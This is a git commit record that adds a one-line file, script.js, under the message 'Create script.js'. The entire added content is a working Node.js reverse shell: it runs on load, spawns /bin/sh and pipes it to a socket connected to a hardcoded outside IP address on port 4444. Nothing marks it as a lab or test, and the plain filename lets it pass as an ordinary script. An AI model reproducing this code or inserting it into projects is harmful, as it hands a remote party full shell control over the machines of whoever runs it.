eeaf22a100bfe59aac9e7d34b9b7ce675405d8ac
Rafa Madolell Vargas <90782385+insanerask77@users.noreply.github.com>
2024-02-09 12:06:32 +0100

    Create script.js

---
+++ script.js
@@ -0,0 +1,1 @@
+(function () { var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(4444, "95.217.210.147", function () { client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();
